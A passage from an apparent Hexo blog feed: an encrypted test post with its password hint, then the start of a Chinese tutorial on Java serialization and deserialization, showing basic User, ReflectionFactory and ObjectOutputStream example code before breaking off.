0cd12d73f212e6d74421f0a8e48e804d5a4e979b89f4a73d7a2b16799b0b44c2a9cc6f47fe6c7f2b65614ffe74db1b37323523edd90f2cedd7f5a9be44fb06af285fbc6417dcc0964d5a3360700dc576425250eb9deecbf9ad606fa4228dbbbbb24401e3017017e422d2a6f6215505f29f5f8cf9d4c503dcb0fa28b93d5bbbd17dd81dd5b40d40c63f2faa7dc49f906ba03547268df6df6fbd06b27bac4f2281c975b40da3f02dc073dbce818e25951a8febf910e30976ee375cf8c7454d40c50408d3711e89c7b02543a81c57a9079b983de853faca1f0da95133a43ae424ffcbd77731dae4c7693ce6632ffeab63862caae97405e6c8cc6d785bb9f3679fdd0c79baa31a069e40fcfd96024679210d97d6de7872e31b3dab92b5430dcb63bf8eab7b13d73e7d4d8647de4907a4a23009a9bd694a869e185f57cfe6b17ee33607bfbd99a54fc497f641aead3c4d9d267efde8220d5e2157244cbf670cea3c1aaaa56b32b6ba5fd9585f2514455c897e1e9ada84def88db8a646b66694212320c55861c570052106f4e3f71a1c8c31de8c81543d7f32664ae1e078d6a4b5c3c88fed0393a309e6e1ba1fe6fdd495bc3f373254bf018b94a65625cc812f45aa2380456ddbc85d011098bee6d62c7b7af0b7bcc8332dd4b389f8f267fd58e4e1257db88aa92e938d656af856747d7df3cb13f2e8207ae279b62af22b6477e76eceb20f57457b7302adbcd466c2cb5e76dbdc8610d43eac1aa97c45eacfd9168c957c1c741e9e559f070a5e7557065d85019c633a96f2a4a7cdffb7543c2decfc856fe89648c45824bb54f9636c45f19ac6f67397e7e9767877dc8e58689387c51916b739a248c3cd77f33c872c264e56057bb5bb9c45a992532deaea4a19fcf2832650513765032215d37a995da258e4328f570d38f26912bf8b44405fa58c0f44af902caf866ab6eb96b9f5a7f89b126b4c2c762b3fbbd05cef076172b5dca03208ed9c61ada0cd5b401390f5abc7139ca6d719208fde06b8e0fa57dd73a4e4c203c6d07622aa49d5fc4569609cab5829763af1703216395a0a738c6f4c38bafd362c4a9401cb6b591d1b38b21ae408a07c2dee9691adbd6604ecc04f0707c4ba038e4db1c05f860fbb854d6d55fc17c49a859e043c052fbad2736efa77ba52aeeda0939ca08aac976b924e9a54ff9ea17135519ab2bd18827ee77f3333ff4ee74a1c504ee33b08a9da8c46f7da3fac255432c92f301cdd7a45e2f5d08d36b09a4bb55ce4be777b8a566023108f6e38c5cb4c00b638dfe046413ad2aea00b6f1b849d8c8f74067ce8e21c014709e87f0a5f8ec626fe760e2e01c50d7e9a0f804d7cb4df488cbb681f3c9eea677a6eb28dcdc032e0552e02cf3a9326c547e4ac5aa70b2460787bfd6c2f2d67d06dae6e9a58635832235f26f466fdb3a53ba53c135760b70dfe2d5ee79220df8d3b86c833067ffb774187c451f1e52f3949204e72a7f74054a54720dc3f90c8288fe913485ed49d52d58a8b48baf4e1f47794cee5e4a58a08aa3918502dbb1470b52b6e9fb151c4c8ceef6f904e4f42cc3504e042e9e04afda907ff82671271e7d1295dbfad7a7a4517a7d5360191b4788d2468354214a73352ade6eb1af6e0aa23035a27b4db3c32eaa998294c0ffddd052fff58bdf43f5993c1c78db7be807267f7dd9adbb7ebf01dbfc3b278f998bdf74df15c9371b7d2a1a7fdf9a011969108f08bd01c913fa905e84ce73389440f486aea4e4e99c2cc965ce94cd4426e50f39b4eeecf14ed3241e8cc1766c7cfb2f2979b643a85cfb083742fe875232be2f7f7018b4563cc25f65e210bd75e5bf14d7e8187c49ea7e8dfb20879ac23bbea0b4f9f1f8341205b1a0af90725376ccec22da871ec1380d4fb41a9c310373f21c266a5f704b123d83be3c30b6370cb59aea535b8c11205655e521f8ea7ca976c8aa75a89510d347f0e8097fec0e8b79a8f3de3d105595e8c8f9419f40bb119ff2276f8a350e4538d023080b77805cadf4011e27855afce81ed43dbcc5662ee3a72d917da87c11aa82da366e5583a301208c60734af712121714643dee91cb8c96a2b40a11a0fd92059ffdb0ec47d344abe4506e6a85e28d74ca86cbc2d47d15777574ab2ca62eab662dd0875b233503a65657bf48e3355e48dd2ee98d0898debc532397c59e1cbd691b138a21c734837c0f555f967ad9420f59c4fa217801e04603e84e008cae4a56b99da2f4e4f84de2927899d1df854e64f89b592975406474f32a11844c64de57c6e2b7814a5bf422689dbda073e8d7af726697971158f54e039e0999d385a4dd0ec566b81e05b81076d35ad14123025fc69d37b1376844537d8d8c9382f351e509af81d67da6e62914669d9aa376fcfcdc958cb8d082e53f1d4e0810de62c792501c68ea400b8954c07218373002fa1934275d7a079decc7304bd859171847eb6bcf753002af8467f1321d9a899bbd864dfa18288a2030d31983c8538e2cea3f2b3b572d8bceeaee34201df18de612fa03a3c0bace2fc3270a90ec87d47b40e7ee0f7ab772071967d23a11e52cd94fb6690fa645faeaa386cdb887731db03384acc2c3ab66fc35c7a3e6c586b67ebc48b3dec4e1280fc20db7f8e0b4b1deb1104c27a43311f4b3e6dcade09aca4d0bb298bb030cc3d44e2fb93c33c11ce10b88c2a6ec08c9349e71db703c727dde9c0c618acbb48147f54353ce8a31e1ad65eb8b5d3cd00e95eff1a76fe51f8155a4af783d6573efdaadd95409047002c7027adf648b248c01ba01f52f53fd48ee7d8ef06e8b56aaebf5cb8e0394c49d4d0f2855fbece63da925da707924b3be921dea91a764ffb5e570c46136c2bf22952dddf69e107216b6ed9b4351cdd7987e0e55e2e807a8f105bac0354fd35b94a59c61909ec9595eadae2248e98b7320b51a41e6cb558c0adc3ecb703d088c8b3562c8d06bec5e565b2b3b1209b0130401d4ab13f502ee86ad73fc6141d8a15b4a03d7e15815d96552a5bc86d0fd93599016a6a3dd4bc3976712ba0b4df95736849fe79b90a54e621e0d2269625d5f287017859a3bed8d143f172741589ab16118fd7d983084f5a8c1cd4425e5e0089abc6f3383f9ca272fbafb9673749f0c92ed02b8a99cd9ace14fa0ca269b95da361e99e743add90e94cf04d973984d345a02cbf6163d138a9fa989ddb5cd279c15fe11f9113d756236d2d214c665eb6a0623c3d530c6c387fa94fee6d8a3e42fd27fbad903b756b765f2dd36e144ea442e65d8c8bbb3209bfc10580b1bec5c59e41296cec19c946a0fad81079fdb69917fbac82b281b6a59048fde405a0f3965bdb5434c09e7ab608ff480c322377c57e2c57180613dbee5bb418da59cd497782665c60f069bfeae89962102080ef104a833b80635a420c00d69873fde547c336bbd62d2670235a0f944956149ef6a279b271f61c49d5aca2c0fa7dac4c9d58746116650e5511ee598d4d504f33fea16612b1d7aeb061e8e371f77e8f079c7028e113901f77010e8fcab92cce0eeee918e50f817733345ebfbf0bebb81cbd3f7e2082f928115a941c39652da6d9a6094715061cc1a78fb898d4c8773b1022f2be21b0356fe9d6b49c7a879b099b26081f4242982b0a06c1d84bd2701b8a5578f536ae4d28aef7b7eb65e5517736eb659fb2ea090e8bffa74aacf3a373aed9701f6e085bcee4465066b3ff664b50fef3bc359f2c1e13217851507fc65c8ed26f2bdbec2b230823eb6c86c31d6ddfb1edb073d1b564b54d56285f5a398fba1004e623a718bfe25d9009e083bac394518f4e7a01d11b679cdfd602931c78192ee5ee0ae33cab33edb3d6997a57c0744f69ae9cf02240d503de86cdf46d364117aef48988bf54adb0834a545a9e1a64183ee308d45b3df7bc2392d2f7bb23b39b5eeb322310c12f19df4cf232518a5ce19decfaefa2160d5b79c2b232bf940006a553baf5e86e3a0828cbabc65849235ed483fecfa90e4c26ed7dcdda30ebea13ed82f60953ca9dfbbfecfc78f11684fbbe1f520dbe1632b9cda0b5aed8f001363851d658e52f609b5494e75f9887bfcaf9ecf4efdb984ad3e5114e291d134a164f27a83d6d7effff6426dec3ca380ba5d8c3a14ff98844ce75a9e1541cbf3f9feea7b7954a88efaa7e1df242a9609e92f30a3a2d8f1250ffc12477f366abb7bd2bf10c7f86b14bf410000ddeec61d9a8fb3ec0abf49d1110f246649abf158a9556adf2d1c245b4b8d5315dcf670ea53cdf8c373b880275d31d4482a66a7c8b195a7ef7d0f08d780f097143ec64302ca84214ab200ee2bd80e5330f1f2c11756dfbb3f0fa2c14469006d28dbc0cc887b763f71c07944f32138e22025f85ea3511094d11d7dcccd88fc995eabe5699f30305f5664042d35066d1680842eda27783c87d9808192eb96d8f116be7ae9229c13830d407b55064c32dd96dc11d130676c55c90db710604f1a72e3a31be904a8d1c0b083f34210ed6083f7bb08aa2a8e7aefd0c884d63f39f2e8737f5109a5961486aa8bdc40771acf084f1e3ba0475aa971db06a47dd1bd1cf8a0bf0bc45c1e9e0a0780079139ea33bec6740c1fb87e77b09aa53e848a700a880b54827c39c626f62d62a86287ac1cbc9058b75c157f8e8325031648d84d999153e1115a00926fbfc97f43fbd35d06fd2d747b975fdee8164ea3f3e490d138d6461a2db7bdfe56d3799d4c81f217f588593bd91dc4805d76d1235a2654d38884696c062bc624d7d904d79d060664ad74b04992ed3aac720f0871427c84f70ea02e2af3e4e50b332442051232d16c489d6ab3411fbd25caa594ad4bb0a1942c598f4d1a0dcb0d515b5c61ee3148ccf373e484c86664f2b9bb069286cee6bf7bb76f271c6fb11646971db05bf21a3c5cafcb0b123d3234236f959e0dbbf01eda20b92dd8066efdcd4c15b8be43d28eb278feda6c59613e57ac792b4953208421c70eef6bb159fe3171560bf8d8841d3f999db176cb9321ef5d6e615c3f766dcf6924a3015e455f87d21721ffeab7331fede817e19115bba9758974cedb73f68175726a4f398dd3de72d91c00e0c3f88940a9aef1b27962f8e7fd7253896d7124858d833c170640afa158dfed9d81c746bed44097978f69d6ff977f4b7a0b314e2a398380e80ad1b70fa18574f1b1baceb42a6ef363ee3e8676112c9fad1f64e2e2d61c866f64187638beaee90dea45a95df6543992e12475505306011a9b70bbfaa2b162d2b9a9bbdce0615a491adfe209a68355f04bc2732ff5a97f108b75a4352df98f935f60b655060ce8e3d3a765a5d7f630a6a4fe21b6c63f02dcf784e30fd915cd1868b846f091381f70378415ef28fcb4ff7380f935eba3a4946b81d9298a38f5f70720bd45082cd123478d8cfd51112909b7a0aa4bd3363a10cbc7ff3722ddadee602cc47b756e40abd8070ddd2a10646f7af1be23979b6eb4d50d863ccadd1ab3a338087471de87b022eae1cbf09f160e1b2682087fe49ba3f7aa19cbe96a9512b9cf34a6ced0c69ac319df34683ac5a298127edf370f286f51fb966597f4d7d043bdfa8239bc0b193fa8fdb2eea0d100a71baa83faf913b77b053d7e282c0908d1917251c6442c51ba665c9d82481c30147f9a834b40b1e2515f04d0c9eb3aabadb3e825cb718e171a32c3c9a247a97948fa7cefd84c10bdd27aa7aa31d7b75e55314ef1b00e644bfc84a17cb1b4626eb448dc60528480788ddd15985c00f52814aa0636df91ae23481cb44445166bd37931747e9a6ffbde55aa0cd93f6d252207eb1e87ba68ae7408a9802d65a54a133f43f9e05cea8b5f35d75da1a742242c4dc169e79a05a8f3ee355c99e2780c0c7aaf908c08c17c614fb21d0307e7186b2ed53389b4ef0d4874cd00c5c688c345c6be95a332266ec2b21266fe1533710bad9c7e5b3cb86be1870dc98e69f5c386830d6004033ecbda5cc2edcb278be4b7e9ed746e3ea5298295e88910afe71c4a2a6a898f9826a0139f5f65c07ccb0027fbf91951d4ca01e40fba72ff74884125ecc569a7a913611244dbe73b0ed235f92771bac367a9951bcbdacaf76e6690b76e4c9e7db588c4f76b44a98e6a9d56afe09db67d6342ae4dc0fda387bda234017902a1a1542df8520092cb681ebce701711ad6bbca1270ccd27cade57bdf8ec9d392108b9f6d256557e93f07781c87719a1318f34f9aa8fa3928720bba849e94bda6df04e72c71f17bf4bbe2024eda1e1ad1f0273339164d2b32171aba4b9de4c6a0d33658b9de93a66b0f2271a24f10a20f6ed81b5d837f6ad03549b26cde556be85adb514c0db876b42e93ebac138929068e751c54dee2b9d462ebb2f4ec55b1cdb868a7819d8568cdf34020092b440128469f5b918f65d36a6e23f104f56f9fe4b2f4ac10d30b95ff79316620714c8dce6e730c7506dcc2606a00ba4d93b559df790bf9e00541a1eb9469f7c6b86794153348b31d2f8baa719ddae4b14306557b9610c7130052706718e458d583bea14d130e69b257622c85c4bf65f19a4e8b3c02e45d7de4891bb062af338ac17402ba47953fe0cff431c6ed123add72e7a99afb7eee58f0ec382890b0b0063378ed6088e1e28f7a2d25d0f9f97a08330c6d36d8adf4e06f432c07a15a516223d30bea674839bef168f3e5957e9fdcd0d4b6a6c4736e51a016b48d072f339071775404b78e102b3f1e7b88309a1c9240b212e0cdf12bd9e36a3213323ef611475f2574b410661ce2f17d388688497ac2d6faebfa6102a6944dcc9513a5997f8bc1daf2062118e2a06d6b35a92a675d6145a5931439efaded605b8b708960186bb06e43fea89565620e2ec54b704c381dae3ee0ec57079808ecc14b93e71707804fe2b249d62276b5a71d1d2ca76c30717ffdaaeec03262ef7a197da6e4e319c785c9ce5edd0023963d7c2cc53b85d8f807fa3f5e4c466e944d0a484cdafcc4a870ee90cf60d4e7cd9336f0f9001fa7e1026c5f12302da3face5373127ecfb4cad5a35b024dc383477e7d16ac6d953e7a97bb296bbf54d3bd2b5e248f157637316877688f9f3847c65861374a4f72c4a3474d13ffc9a238bf8430936efab846c74c082b405c9826dda381fa8de7441d561cdc8137a989cd2a516f4c7e8b6d8e3e18160ff2b870c95e0f1dfd264e2176a9e522b339335dad1323890427384f63b9584fa51f02b6744162f3e59a9eb240c66e556668af7a8f333dd7fee6de8943f65cabcb3daa24c77a4021078b6c4ad22917d92f095f263af726ba3aab931df6f19ec8d8e0fe15f735a6cf8f2ab268e6498b0d4caf8f2370a42b49a931ca1f2d3055673b99651d56604983dc02ffe17b62729bfca0fa5739cd5360aa29f7ad48f5f41ffc134e009a920c4ef5b4e3c41e8255f80bc0379ff8bc52daa97fac0f8869fa105503241c2a6a61f32fc877b99cd79881443c8e67d6b4935b5ea514a8403407f578784cfd59f74a8f6d24d4b1e86c3c6602718b3514af990c0489e312ae14e519286fe65e0d0d3e81e5e7a448f44c7015159d96c20da15f9b42115ce4cd08f91b20df166c1bc66f778eded9452f9b32049eaf2ebb15168975be124b93b7fc1f1d9342a04859410b386845d28ad3a46c631a8d175c5fdee15288ec7560c31b57a759661a74c1842d971fe700b2475d5c76d39af5cf3a36929941c87f657b8c63fdd59a48e35a76e1aea544cf1a6b8e5dceeee948f694f4f06f686d8a9c16024dcaff12f97dd5219db3384f85053d6068e7ad9d01332fb6843cbf56ff2990744378dbebfac3945c022ad2ed7b1ba8ac6ee48b43769cf179f62718d212da83db15b6d8eb413712ebd7b56adb91b154551864cda70b8a84caaf4a83409b570a82f5a9b00b9debbe1609bb5e5ccef22d6cfec1bddc16059658c7af78fc3e635cdf14718ad03f997828e1119259feeb4819868b5d8e7c79bbc8723848d14d36457447d2e3b4f3d7a764385e3400890025fa749b438f5f4d7f6b7c025904ae3a9c788b5fba89768d0d53849db1af4004b2bac9a04f617d058e2b01f206d9e911347188cd7784fb0f1fe5a9c7146c5c078269482d28098fb1f715235d3f4e6508bf4e9af023fd81fd90503cfb256f36d6568a8ee0790b02e9f8387dcbe1493f68140ee99d262212834565c7099ac0339212070086b2a5891f5b46223bfb328dcf4f34ce196420ead12d585afdd694bdccf1b526b37307710a4c359abab56e0e1174ef5ac51fda7b7331c9c52d96f8f6546809ab50482653623eef7aa2b901bb911b7f8173ba9d5e608a76b86e3c253152b845c75e11be462c0bc11b5731aec46019cc2dd29e3354f58e58017c372c5bdd3a6f53484138354a710734c56ea945ee2748392bc33fc48abb32bc792f074bf7e02f1d99743de6b42839983dedb141323c150237b769bcfb1565f285410ccecc6ae270912ffe6f1b9724c86204eef630da7d520e2b41f958d6dc0b86ae0e6fa3b78152d1659d7101307baf49a698feb2e11b1f4bc280d9e05246bfe5ea842da2557d0fcaa2d89bb5312ea5f0bfcb4d5587524f756f91d38c39b5c1cfacadd25d2b4920565740b1024eef1004bec6a68124331ac61f8f25ea5d40c2315f3228534f782f23d8d98d3d7d6ebb8cea8302aacb88ad4fc661f3f4fbccd97b78423bb067831fb55040abcb1fd3fe7276a2fd8923a1faf16302865391e4221a193324be6d3e2617965ad8ae5c6d361fa722ea018e5591e6dd4675f6efa5f81aa55600559656616019397308551a8b9839b93902eddcadaf0e30dadc6c2a6b16ce8f32d4c416231a3b754b360ab8dd71684d53bb361666f9d594a60f3eaab4dcd55ca3c1e9e1dff4580d7963ee9eb89b239b6b400768cc6192e78b7a3792dd7be93179b39a14fd67b5a0a7d1ab91ff08b2ae5966d7a5f0278bf5cdf8e8724eff13e339dcdd10fa520d549ecca6fc724a16ced013d15fe98446d18907b798504391beabe7dcf5e72c7d94de14a27a34ed1ce8af8733b4d85a10337e9c4e60ccb2da614bdc271b4e1dbaeff09172a10110a097700bae68ca5a315d2d3c2d76f6b2ac6545cfbdf32f584b92f1dc6c7e07bd107e4cd43419e7e53d561dc8e44398c3530388509c8d1e747427b58556770f386f4ff2da4ba86bebdfb6095ec38af0e9cab0e2da1419b1c1c8a15df0e7a392a18a057e5c845f1bfaa0311b3c973aa17161006e88afbf6a5dccc65ca78559908e34cd5311f03c8c52c65443552ba344379a3b01ff6b2718ff6604a7df1a3929be4e064a1665e0fa3c156bea92c0990a26e1c170410fe837f0f74ab50f570f82cabb557f8fe36b502a8b4c2ba2db4d0511fe4d14ba08b11f1e856ccf9bdea769a685519f87d4214b3cc2e92ea2bfe6d43d44a44679db6f8b84b3f4c25163d1281ea7d007ceed682938522fbe30ad61d65163603d5fc98a88d544f3e809452d6666bc822e44b357da78d80cb02425f49734dbecee96bbd8f63f3af0e6538815ed5d77f9354050fedd811d1bfc834a39d9f9880009bf39c0477cfc0f7f45efcad85aff1175025ccba5fa9c0f626ff9ee2b2740a439e4c18bd046befb14ff788a71ad24dd06471e6ea1f6f3ba258f9a5b33f851cd326681f37434a5e4b4dc60433d00d03a97061273a3c31f3c97716e7c3f70766bd8050a0cd41c3cccb23590edbbe8daadd61fd800e31ed555507272953ce7bbfb945c99d7aaf4c07cc458a2828840ac8a702f94caa58031aa38dc069d7ead0cb38fad68fd5495077e21d92f721539fb34c57813eb657dbc08d0a38cd0ce726832efdbb705820b591420faeaaf97b58bc3690289c4176a4e0454de1d5d142b73b5868682aafea4cbb4e5a618</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> c语言 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化</title>
      <link href="/2021/09/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2021/09/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript">  SAONotify("secret","旅行者，告诉你个秘密，其实，小青是个......");  </script><h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java对象序列化指的是：将一个Java类实例序列化成字节数组，用于存储对象实例化信息：类成员变量和属性值。 </p><p>Java反序列化可指的是：将序列化后的二进制数组转换为对应的Java类实例。</p><p>Java序列化对象因其可以方便的将对象转换成字节数组，又可以方便快速的将字节数组反序列化成Java对象而被非常频繁的被用于<code>Socket</code>传输。</p><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>在 Java 中，通过<code>java.io.Serializable(内部序列化)</code>或者<code>java.io.Externalizable(外部序列化)</code>接口即可实现序列化，其中的<code>java.io.Externalizable</code>接口只是实现了<code>java.io.Serializable</code>接口。</p><p>序列化类对象时必须满足以下条件：</p><ul><li>该类必须实现<code>java.io.Serializable</code>接口。</li><li>该类的所有属性必须是可序列化的(用transient关键字修饰的属性除外，不参与序列化过程)，如果有某个属性不可序列化，则需要注明该属性是短暂的。</li></ul><p>反序列化类对象时有如下限制：</p><ul><li>被反序列化的类必须存在。</li><li><code>serialVersionUID</code>必须一致。</li></ul><p>此外，<strong>反序列化类对象不会调用该类的构造方法</strong>。因为在反序列化创建类实例的时候使用了<code>sun.reflect.ReflectionFactory.newConstructorForSerialization</code>创建了一个反序列化专用的<code>Constructor(反射构造方法对象)</code>，这个特殊的<code>Constructor</code>可以绕过构造方法去创建类实例。</p><p>编写<code>User</code>类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 11:49</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span>  <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>使用反序列化创建<code>User</code>类实例<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 11:49</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionFactoryTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 获取sun.reflect.ReflectionFactory对象</span></span><br><span class="line">            <span class="type">ReflectionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> ReflectionFactory.getReflectionFactory();</span><br><span class="line">            <span class="comment">// 使用反序列化获取User类的构造方法</span></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> factory.newConstructorForSerialization(</span><br><span class="line">                    User.class, Object.class.getConstructor()</span><br><span class="line">            );</span><br><span class="line">            System.out.println(constructor.newInstance());</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220829150934435.png" alt="image-20220829150934435"></p><h3 id="核心方法"><a href="#核心方法" class="headerlink" title="核心方法"></a>核心方法</h3><p><code>java.io.ObjectOutputStream</code>类最核心的方法是<code>writeObject</code>方法，即序列化类对象。</p><p><code>java.io.ObjectInputStream</code>类最核心的功能是<code>readObject</code>方法，即反序列化对象。</p><p>通过<code>ObjectInputStream</code>和<code>ObjectOutputStream</code>类我们就可以实现类的序列化和反序列化功能。</p><p><strong>对象序列化步骤如下：</strong></p><ol><li>创建对象输出流</li><li>通过输出流的<code>writeObject()</code>方法将对象进行序列化</li></ol><p><strong>对象反序列化步骤如下：</strong></p><ol><li>创建一个对象输入流</li><li>通过输入流的<code>readObject()</code>方法将字节序列反序列化为对象</li></ol><p><strong>代码示例：</strong></p><p>创建<code>User</code>类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 11:49</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span>  <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>创建<code>Main</code>主类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 15:24</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Main</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">        m.serialize();</span><br><span class="line">        m.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输出流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过writeObject方法将类对象进行序列化</span></span><br><span class="line">        out.writeObject(user);</span><br><span class="line">        System.out.println(<span class="string">&quot;serialize success!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 